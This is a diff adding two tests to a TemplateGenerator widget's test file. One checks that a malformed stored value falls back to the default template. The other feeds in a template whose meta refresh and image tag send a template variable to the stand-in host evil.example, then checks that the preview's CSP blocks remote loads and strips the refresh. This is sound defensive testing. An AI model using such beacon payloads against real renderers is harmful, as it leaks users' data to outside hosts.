@@ -100,6 +100,23 @@ describe('TemplateGenerator', () => {
         setSpy.mockRestore();
     });
 
+    it('a malformed payload hydrated by One Save (templates: []) renders the default instead of crashing', () => {
+        // hydrate() bypasses the deserializer: put the bad value straight into the store, as it does.
+        templateGeneratorStore.set({ templates: [], activeId: 'gone' } as never, () => {});
+        const { container } = renderWidget();
+        expect(screen.getByLabelText('Template name')).toHaveValue('Property report');
+        expect(container.querySelector('iframe')).not.toBeNull();
+    });
+
+    it('the preview document carries the no-remote-loads CSP, and a template <meta refresh> is dropped', async () => {
+        const { container } = renderWidget();
+        const editor = container.querySelector('textarea') as HTMLTextAreaElement;
+        fireEvent.change(editor, { target: { value: '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/?n={{n}}"></head><body><img src="https://evil.example/p.png?n={{n}}">{{n}}</body></html>' } });
+        const iframe = container.querySelector('iframe') as HTMLIFrameElement;
+        await waitFor(() => expect(iframe.getAttribute('srcdoc')).toContain("default-src 'none'"));
+        expect(iframe.getAttribute('srcdoc')).not.toMatch(/http-equiv="refresh"/i);
+    });
+
     it('typing a variable value updates the preview iframe srcdoc, HTML-escaped', async () => {
         const { container } = renderWidget();
         fireEvent.click(screen.getByRole('button', { name: 'Variables' }));
